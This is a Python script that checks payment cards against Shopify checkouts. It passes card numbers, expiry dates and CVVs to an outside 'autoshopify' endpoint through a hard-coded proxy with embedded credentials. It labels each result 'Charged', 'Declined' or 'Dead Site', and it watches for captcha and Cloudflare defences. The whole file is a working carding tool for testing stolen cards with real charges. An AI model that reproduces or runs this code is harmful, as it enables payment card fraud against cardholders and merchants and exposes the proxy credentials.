import aiohttp
import asyncio
import json
import re
import time


AUTOSH_BASE = "https://autoshopify.stormx.pw/index.php"
DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
TIMEOUT = 30

DEAD_PATTERNS = [
    "HCAPTCHA DETECTED", "CLINTE TOKEN", "DEL AMMOUNT EMPTY",
    "PRODUCT ID IS EMPTY", "PY ID EMPTY", "TAX AMMOUNT EMPTY",
    "R4 TOKEN EMPTY", "Receipt ID is empty", "Invalid API response",
    "site not working", "captcha detected", "hcaptcha", "cloudflare"
]


async def shopify_api_check(cc, mm, yy, cvv, site="checkout.shopify.com"):
    card = f"{cc}|{mm}|{yy}|{cvv}"
    start_time = time.time()
    try:
        api_url = f"{AUTOSH_BASE}?site={site}&cc={card}&proxy={DEFAULT_PROXY}"

        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=timeout) as resp:
                api_text = await resp.text()

        elapsed = round(time.time() - start_time, 2)

        upper_text = api_text.upper()
        for pattern in DEAD_PATTERNS:
            if pattern.upper() in upper_text:
                return f"Dead Site - {pattern} [{elapsed}s]"

        json_match = re.search(r'\{[^}]*\}', api_text)
        if json_match:
            try:
                data = json.loads(json_match.group())
                response = data.get("Response", "Unknown")
                price = data.get("Price", "0")

                if "APPROVED" in response.upper():
                    return f"Charged ${price} - {response} [{elapsed}s]"
                else:
                    return f"Declined - {response} [{elapsed}s]"
            except json.JSONDecodeError:
                pass

        return f"Declined - Processing Error [{elapsed}s]"

    except asyncio.TimeoutError:
        elapsed = round(time.time() - start_time, 2)
        return f"Error - Timeout [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return f"Error - {str(e)[:80]} [{elapsed}s]"
